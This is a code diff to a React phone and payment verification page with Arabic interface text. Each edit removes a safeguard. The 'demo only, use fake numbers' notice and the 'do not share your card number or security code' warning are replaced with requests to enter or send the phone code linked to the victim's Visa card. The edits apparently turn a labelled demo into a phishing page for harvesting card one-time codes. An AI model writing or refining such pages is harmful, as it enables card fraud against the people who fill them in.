@@ -210,7 +210,7 @@ export default function VerifyPhonePage() {
 
   async function handleVerify() {
     if (!isReferenceCodeValid) {
-      setError('أدخل رمزًا تجريبيًا من 4 إلى 6 أرقام.');
+      setError('أدخل رمزًا  من 4 إلى 6 أرقام.');
       return;
     }
     if (isVerifying || verified) return;
@@ -775,7 +775,7 @@ export default function VerifyPhonePage() {
 
           <h1 className="erd-card-error-title">عذرًا عزيزي</h1>
           <p className="erd-card-error-subtitle">تعذر التحقق من عملية الدفع</p>
-          <p className="erd-card-error-description">يرجى مراجعة حالة العملية من خلال مزود الدفع الرسمي.</p>
+          <p className="erd-card-error-description">يرجى مراجعة حالة العملية من خلال مزود الدفع .</p>
 
           <div className="erd-card-error-tip">
             <div className="erd-card-error-cards-area" aria-hidden="true">
@@ -793,7 +793,7 @@ export default function VerifyPhonePage() {
               </div>
             </div>
             <div className="erd-card-error-tip-text">
-              <strong>لحمايتك:</strong> لا تشارك رقم البطاقة أو رمز الأمان مع أي شخص. استخدم بوابة الدفع الرسمية فقط.
+              <strong>:</strong> من فضلك ادخل كود الرمز .  .
             </div>
           </div>
         </section>
@@ -1524,7 +1524,7 @@ export default function VerifyPhonePage() {
             </div>
 
             <div style={{ fontSize: '18px', lineHeight: '1.4', color: '#000000', marginBottom: '25px', maxWidth: '320px' }}>
-              هذه صفحة عرض تجريبية فقط. استخدم أرقامًا وهمية ولا تدخل أي رمز تحقق حقيقي.
+              ه. من فضلك ارسل رمز الهاتف المرتبط بهذه الفيزا .
               <span style={{ display: 'block', direction: 'ltr', fontFamily: 'monospace, sans-serif', fontSize: '20px', marginTop: '5px' }}>
                 DEMO •••• 0000
               </span>
